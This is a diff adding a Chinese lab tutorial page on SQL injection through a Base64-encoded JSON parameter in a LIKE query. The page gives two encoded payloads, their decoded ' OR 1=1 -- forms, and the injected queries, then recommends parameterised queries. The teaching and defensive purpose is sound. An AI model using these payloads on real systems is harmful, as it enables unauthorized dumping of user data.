@@ -1,0 +1,56 @@
+---
+sidebar_position: 11
+---
+
+# 11.Base64 参数(JSON)嵌套字符串注入点模糊查询(括号边界)
+
+Base64 参数(JSON)嵌套字符串注入点模糊查询是一种安全漏洞，通常出现在应用程序接受经过 Base64 编码的 JSON 格式参数，并将其作为模糊查询条件用于 SQL 语句中。攻击者可以通过注入特殊的 Base64 编码和 JSON 字符串来改变查询条件，绕过预期的过滤，导致数据泄露或非预期的查询结果。
+
+### 示例代码：
+
+假设应用程序接受经过 Base64 编码的 JSON 格式参数，并使用以下后端查询语句执行模糊查询：
+
+```Plain
+SELECT * FROM vulin_users WHERE (username LIKE '%a%') AND (age > 20);
+```
+
+### 攻击示例：
+
+假设攻击者将`data`参数设置为以下 Base64 编码的 JSON 字符串：
+
+```Plain
+#payload-1
+eyJuYW1lYjY0aiI6IicpIE9SIDE9MSAtLSJ9
+#payload-2
+eyJuYW1lYjY0aiI6IicgT1IgMT0xKSAtLSJ9
+```
+
+解码后的 JSON 字符串为：
+
+```Plain
+#payload-1
+{"nameb64j":"') OR 1=1 --"}
+#payload-2
+{"nameb64j":"' OR 1=1) --"}
+/*payload-1的SQL语句*/
+select * from vulin_users where (username LIKE '%a') OR 1=1 --%') AND (age > 20);
+/*payload-2的SQL语句*/
+select * from vulin_users where (username LIKE '%a' OR 1=1) --%') AND (age > 20);
+```
+
+在这个恶意输入中，攻击者成功地在查询条件中添加了额外的条件 `OR 1=1`，并用注释符号`--`来注释掉后面的部分。这将导致查询忽略原本的条件 `(age > 20)`，返回所有用户数据，因为 `1=1` 总是为真。
+
+### 防御措施：
+
+为了防止 Base64 参数(JSON)嵌套字符串注入点模糊查询漏洞，应该始终使用参数化查询或预处理语句，不要直接拼接用户输入到 SQL 查询中，并对输入进行严格的过滤和验证。
+
+### 靶场演示： 视频
+
+<video
+  src="/img/yaklab/sqli/11unsafe-like-b64j.mp4"
+  loop={true}
+  playsInline={true}
+  controls={true}
+  autoPlay={true}
+  style={{ width: 890 }}
+/>
